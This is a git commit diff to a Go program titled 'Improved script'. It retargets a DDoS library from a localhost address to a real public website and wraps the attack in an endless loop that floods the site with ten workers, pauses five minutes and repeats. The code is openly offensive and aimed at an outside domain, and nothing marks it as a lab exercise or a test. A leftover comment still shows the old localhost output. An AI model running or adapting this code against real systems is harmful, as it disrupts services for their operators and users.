ce88ab26a9d8c53c4212f954b9c32e3ea7a7001b
Dmitry Kalinin <kalinin.mitko@gmail.com>
2025-04-14 19:55:38 +0300

    Improved script

--- main.go
+++ main.go
@@ -8,14 +8,20 @@ import (
 )
 
 func main() {
-	workers := 10
-	d, err := ddos.New("http://127.0.0.1:80", workers)
-	if err != nil {
-		panic(err)
+
+	for {
+		workers := 10
+		d, err := ddos.New("https://omnitools.app/", workers)
+		if err != nil {
+			panic(err)
+		}
+		d.Run()
+		time.Sleep(time.Second)
+		d.Stop()
+		fmt.Println("DDoS attack server: https://omnitools.app/")
+		// Output: DDoS attack server: http://127.0.0.1:80
+
+		time.Sleep(5 * time.Minute)
 	}
-	d.Run()
-	time.Sleep(time.Second)
-	d.Stop()
-	fmt.Println("DDoS attack server: http://127.0.0.1:80")
-	// Output: DDoS attack server: http://127.0.0.1:80
+
 }
